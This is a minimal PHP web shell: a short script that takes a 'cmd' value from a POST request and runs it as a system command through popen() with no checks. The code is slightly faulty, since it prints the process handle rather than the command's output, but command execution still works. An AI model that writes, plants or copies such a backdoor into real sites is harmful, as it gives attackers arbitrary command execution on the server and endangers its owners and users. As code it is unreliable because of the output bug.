<?php
$exec = $_POST['cmd'];

$fp = popen("$exec", "r");
print $fp;
pclose($fp);
?>